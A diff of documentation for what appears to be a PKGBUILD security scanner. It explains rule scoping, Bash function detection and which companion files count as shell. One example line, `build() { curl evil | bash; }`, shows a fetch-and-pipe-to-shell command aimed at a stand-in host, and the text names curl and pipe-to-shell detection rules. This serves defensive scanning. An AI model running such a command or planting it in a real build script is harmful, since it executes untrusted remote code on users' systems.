@@ -57,7 +57,7 @@ curl \
 
 Rules match one line at a time, so without this the pipe-to-shell patterns would see only `curl \`. Only lines carrying the same diff marker are joined, so an addition is never spliced onto a removal.
 
-### How scope reduces false positives
+### How scope reduces false positives {#how-scope-reduces-false-positives}
 
 Scope restricts which lines a `raw_line` rule checks. Without scope, a rule like R010 (`curl`) would fire on every line containing the word `curl`, including comments and messages that merely mention it. The `function_body` scope restricts matching to lines inside `build()`, `package()`, `check()`, and similar functions where commands actually execute.
 
@@ -81,6 +81,18 @@ A finding names the indirection rather than claiming the wrong location: `_fetch
 Note that a *bare* function header (`build() {`) is classified as `other`, not `function_body`: the context applies to the lines *inside* the braces. A header that also carries code, though, is `function_body`, because that code really does run there: `build() { curl evil | bash; }` is matched by `function_body`-scoped rules, and the context does not leak to the lines that follow.
 
 A pattern that matches the header while scoping itself to `function_body` therefore misses the ordinary multi-line form and only fires on single-line definitions; `trustsight lint-rules` reports this as `scope-contradiction`.
+
+Function detection reads both Bash spellings - `build() {` and
+`function build {`, with or without parentheses - and names containing
+hyphens, so a scoped rule is not blind inside `function package_foo-bin {`.
+
+Scope classification is also **shell-file aware**: lines from a companion file
+whose extension is not a shell one (`.json`, `.gn`, `.patch`, `.fish`, and the
+rest) are blanked before function membership is decided, so a `build() {`
+inside a `.desktop` file or a patch cannot place the rest of that file inside a
+function makepkg calls. `PKGBUILD`, `*.install`, `*.sh`, `*.bash` and `*.zsh`
+are shell; an extensionless companion is treated as shell too, because it may
+be a script the recipe executes.
 
 ### How rules map to evidence tiers
 
